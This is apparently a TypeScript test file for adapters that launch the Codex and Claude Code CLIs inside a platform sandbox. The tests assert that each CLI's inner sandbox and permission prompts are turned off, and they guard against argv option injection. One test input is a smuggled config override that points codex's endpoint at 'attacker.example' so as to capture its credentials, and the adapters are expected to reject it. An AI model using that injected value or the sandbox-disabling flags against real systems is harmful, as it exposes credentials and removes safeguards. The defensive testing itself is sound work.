import { describe, it, expect } from 'vitest';
import type { ResolvedImageSpec, SandboxExecFn } from '@platform/contracts';
import { CodexAdapter } from '../../src/infrastructure/adapters/codex/codex.adapter';
import { ClaudeCodeAdapter } from '../../src/infrastructure/adapters/claude-code/claude-code.adapter';

/**
 * The S5 run half of the two built-in adapters (04 §3 ★1 / ★2). Two things matter and
 * are asserted here rather than left to prose:
 *   - `getInstallPlan` is keyed on the (image, runtime) PAIR — the same claude-code is
 *     a 753s install on one image and zero on another;
 *   - the INNER sandbox of each CLI is turned off in `buildStartCommand`, in that CLI's
 *     own vocabulary. The two vocabularies have nothing in common, which is exactly why
 *     this cannot be a platform-generic rule.
 */
const image = (ref: string): ResolvedImageSpec => ({ ref, digest: 'sha256:x' });

describe('getInstallPlan is keyed on the (image, runtime) pair (04 §3 ★1)', () => {
  it('codex is preinstalled on the AIO default image and installed elsewhere', () => {
    const codex = new CodexAdapter();
    expect(codex.getInstallPlan(image('ghcr.io/agent-infra/sandbox:latest')).strategy).toBe(
      'preinstalled',
    );
    expect(codex.getInstallPlan(image('debian:bookworm-slim')).strategy).toBe('install-on-start');
  });

  it('claude-code is NOT on the AIO image — the 753s case that proves the pair matters', () => {
    const claude = new ClaudeCodeAdapter();
    const onAio = claude.getInstallPlan(image('ghcr.io/agent-infra/sandbox:latest'));
    expect(onAio.strategy).toBe('install-on-start');
    expect(onAio.estimatedInstallSec).toBe(753); // measured, not guessed
    expect(onAio.packageManagerCmds).toEqual(['npm install -g @anthropic-ai/claude-code']);

    const onBoxlite = claude.getInstallPlan(image('localhost:5001/cap-boxlite-sandbox:yolo'));
    expect(onBoxlite.strategy).toBe('preinstalled');
    expect(onBoxlite.packageManagerCmds).toEqual([]);
    expect(onBoxlite.estimatedInstallSec).toBe(0);
  });

  it('names the binary the platform probes for a version (13 §2.3.2)', () => {
    expect(new CodexAdapter().getInstallPlan(image('x')).requiredBinaries).toEqual(['codex']);
    expect(new ClaudeCodeAdapter().getInstallPlan(image('x')).requiredBinaries).toEqual(['claude']);
  });
});

describe('isInstalled goes through PATH, never a hard-coded path (RA-01 / 04 §2.1★)', () => {
  function recordingExec(codes: number[]): { exec: SandboxExecFn; calls: string[][] } {
    const calls: string[][] = [];
    const exec: SandboxExecFn = async (cmd) => {
      calls.push(cmd);
      return { stdout: '', stderr: '', exitCode: codes.shift() ?? 0 };
    };
    return { exec, calls };
  }

  it('runs `command -v` and then a real `--version`', async () => {
    const h = recordingExec([0, 0]);
    expect(await new CodexAdapter().isInstalled(h.exec)).toBe(true);
    expect(h.calls[0]).toEqual(['sh', '-c', 'command -v codex']);
    expect(h.calls[1]).toEqual(['codex', '--version']);
    // nothing resembling a hard-coded install location is ever mentioned: the npm
    // prefix is the user-level /home/gem/.npm-global and codex resolves via an fnm shim.
    expect(JSON.stringify(h.calls)).not.toMatch(/\/usr\/local|\.npm-global|\/root/);
  });

  it('a resolvable-but-broken shim (`--version` fails) counts as NOT installed', async () => {
    const h = recordingExec([0, 127]);
    expect(await new CodexAdapter().isInstalled(h.exec)).toBe(false);
  });

  it('nothing on PATH short-circuits before running the binary', async () => {
    const h = recordingExec([1]);
    expect(await new ClaudeCodeAdapter().isInstalled(h.exec)).toBe(false);
    expect(h.calls).toHaveLength(1);
  });
});

describe('buildStartCommand turns OFF each CLI’s inner sandbox (04 §3 ★2)', () => {
  it('codex: `-s danger-full-access` — bwrap cannot get a mount ns in EITHER provider', () => {
    const cmd = new CodexAdapter().buildStartCommand({
      prompt: 'fix the login bug',
      headless: false,
      workdir: '/workspace',
    });
    expect(cmd.cmd).toEqual(['codex', '-s', 'danger-full-access', '--', 'fix the login bug']);
    expect(cmd.cwd).toBe('/workspace');
  });

  it('codex headless uses `exec`, and json-stream adds --json', () => {
    const cmd = new CodexAdapter().buildStartCommand({
      prompt: 'run the suite',
      headless: true,
      outputFormat: 'json-stream',
    });
    expect(cmd.cmd.slice(0, 2)).toEqual(['codex', 'exec']);
    expect(cmd.cmd).toContain('--json');
  });

  it('claude: `--dangerously-skip-permissions` — a permission model, NOT bwrap', () => {
    const cmd = new ClaudeCodeAdapter().buildStartCommand({
      prompt: 'translate the README',
      headless: false,
      workdir: '/workspace',
    });
    expect(cmd.cmd).toEqual([
      'claude',
      '--dangerously-skip-permissions',
      '--',
      'translate the README',
    ]);
    // the two CLIs share NOTHING here — the reason this stays per-adapter.
    expect(cmd.cmd).not.toContain('danger-full-access');
  });

  it('claude headless prints and can stream json', () => {
    const cmd = new ClaudeCodeAdapter().buildStartCommand({
      prompt: 'summarise the diff',
      headless: true,
      outputFormat: 'json-stream',
    });
    expect(cmd.cmd).toContain('--print');
    expect(cmd.cmd.join(' ')).toContain('--output-format stream-json');
  });

  it('an empty prompt is not passed as an empty argv token', () => {
    expect(new CodexAdapter().buildStartCommand({ headless: false }).cmd).toEqual([
      'codex',
      '-s',
      'danger-full-access',
    ]);
  });

  it('buildAttachCommand keeps the same inner-sandbox switch, without an instruction', () => {
    expect(new CodexAdapter().buildAttachCommand().cmd).toEqual([
      'codex',
      '-s',
      'danger-full-access',
    ]);
    expect(new ClaudeCodeAdapter().buildAttachCommand().cmd).toEqual([
      'claude',
      '--dangerously-skip-permissions',
    ]);
  });
});

describe('buildStartCommand(resumeFrom) — 多轮续接 (04 §3 ★4)', () => {
  it('codex resume is a DIFFERENT SUBCOMMAND, and must not carry `-s`', () => {
    const cmd = new CodexAdapter().buildStartCommand({
      prompt: 'what number did I ask you to remember?',
      headless: true,
      outputFormat: 'json-stream',
      resumeFrom: '01996b8f-4d21-7a0c-9f3e-2c5d8a1b7e40',
    });
    expect(cmd.cmd.slice(0, 3)).toEqual(['codex', 'exec', 'resume']);
    // the measured trap: `codex exec resume` accepts neither -s/--sandbox nor -C/--cd,
    // so an argv built by appending to the START argv dies with
    // `unexpected argument '-s' found`.
    expect(cmd.cmd).not.toContain('-s');
    expect(cmd.cmd).not.toContain('--sandbox');
    expect(cmd.cmd).not.toContain('-C');
    // the equivalent capability goes through -c instead.
    expect(cmd.cmd).toContain('-c');
    expect(cmd.cmd).toContain('sandbox_mode="danger-full-access"');
    // the reference is a positional of `resume` and precedes the prompt.
    expect(cmd.cmd.indexOf('01996b8f-4d21-7a0c-9f3e-2c5d8a1b7e40')).toBeLessThan(
      cmd.cmd.indexOf('what number did I ask you to remember?'),
    );
  });

  it('codex WITHOUT resumeFrom keeps `-s danger-full-access` and never says `resume`', () => {
    const cmd = new CodexAdapter().buildStartCommand({ prompt: 'go', headless: true });
    expect(cmd.cmd).toContain('-s');
    expect(cmd.cmd).not.toContain('resume');
  });

  it('claude resume is a FLAG — the shapes do not generalise, hence per-adapter', () => {
    const cmd = new ClaudeCodeAdapter().buildStartCommand({
      prompt: 'and the number?',
      headless: true,
      outputFormat: 'json-stream',
      resumeFrom: 'c1f0e6b2-9d3a-4f77-8a11-2b6c5e90d4aa',
    });
    expect(cmd.cmd.join(' ')).toContain('--resume c1f0e6b2-9d3a-4f77-8a11-2b6c5e90d4aa');
    expect(cmd.cmd).toContain('--print');
    // measured: cwd does NOT bucket an id-based resume, so no workdir pinning is needed.
    expect(cmd.cwd).toBeUndefined();
  });

  it('claude stream-json carries --verbose, which the CLI REFUSES to run without', () => {
    const cmd = new ClaudeCodeAdapter().buildStartCommand({
      headless: true,
      outputFormat: 'json-stream',
      prompt: 'go',
    });
    expect(cmd.cmd).toContain('--verbose');
    // and a caller who whitelists it too must not get it twice.
    const dup = new ClaudeCodeAdapter().buildStartCommand({
      headless: true,
      outputFormat: 'json-stream',
      extraArgs: ['--verbose'],
      prompt: 'go',
    });
    expect(dup.cmd.filter((a) => a === '--verbose')).toHaveLength(1);
  });
});

/**
 * The `--` terminator, and why it is a SECURITY assertion rather than a style one.
 *
 * `prompt` and `resumeFrom` are caller-supplied and land in argv as POSITIONALS. clap
 * (both CLIs) reads any token starting with `-` as an OPTION, so without a terminator
 * either value is a complete bypass of the `extraArgs` whitelist — the whitelist that
 * exists because "anything appended to argv executes, and argv is world-readable inside
 * the sandbox". The concrete exploit: `-cmodel_provider.base_url=http://attacker/` is a
 * codex config override, and codex's credentials live in `~/.codex/auth.json`, so it
 * redirects the injected key to an attacker's endpoint.
 */
describe('positional arguments are DATA — `--` closes the option list', () => {
  it('codex puts `--` before the resume id and the prompt', () => {
    const cmd = new CodexAdapter().buildStartCommand({
      prompt: 'go',
      headless: true,
      outputFormat: 'json-stream',
      resumeFrom: '01996b8f-4d21-7a0c-9f3e-2c5d8a1b7e40',
    });
    const dash = cmd.cmd.indexOf('--');
    expect(dash).toBeGreaterThan(0);
    expect(dash).toBeLessThan(cmd.cmd.indexOf('01996b8f-4d21-7a0c-9f3e-2c5d8a1b7e40'));
    expect(dash).toBeLessThan(cmd.cmd.indexOf('go'));
  });

  it('claude puts `--` before the prompt', () => {
    const cmd = new ClaudeCodeAdapter().buildStartCommand({ prompt: 'go', headless: true });
    expect(cmd.cmd.indexOf('--')).toBeLessThan(cmd.cmd.indexOf('go'));
  });

  it('a prompt that LOOKS like a flag stays a prompt', () => {
    for (const cmd of [
      new CodexAdapter().buildStartCommand({ prompt: '--help', headless: true }),
      new ClaudeCodeAdapter().buildStartCommand({ prompt: '--help', headless: true }),
    ]) {
      // it is still in argv (it is the instruction), but it is AFTER the terminator.
      expect(cmd.cmd.indexOf('--')).toBeLessThan(cmd.cmd.lastIndexOf('--help'));
    }
  });

  it('REFUSES a resumeFrom that is not a session id, in both adapters', () => {
    const attack = '-cmodel_provider.base_url=http://attacker.example/v1';
    for (const adapter of [new CodexAdapter(), new ClaudeCodeAdapter()]) {
      expect(() =>
        adapter.buildStartCommand({ prompt: 'go', headless: true, resumeFrom: attack }),
      ).toThrow(/session id/);
      // a plain non-uuid is refused too — the check is a FORMAT, not a `-` blocklist.
      expect(() =>
        adapter.buildStartCommand({ prompt: 'go', headless: true, resumeFrom: 'sess-abc' }),
      ).toThrow(/session id/);
    }
  });

  it('accepts the shapes the two CLIs really emit (UUIDv4, UUIDv7, ULID)', () => {
    for (const ref of [
      'c1f0e6b2-9d3a-4f77-8a11-2b6c5e90d4aa',
      '01996b8f-4d21-7a0c-9f3e-2c5d8a1b7e40',
      '01ARZ3NDEKTSV4RRFFQ69G5FAV',
    ]) {
      expect(() =>
        new ClaudeCodeAdapter().buildStartCommand({
          prompt: 'go',
          headless: true,
          resumeFrom: ref,
        }),
      ).not.toThrow();
    }
  });
});
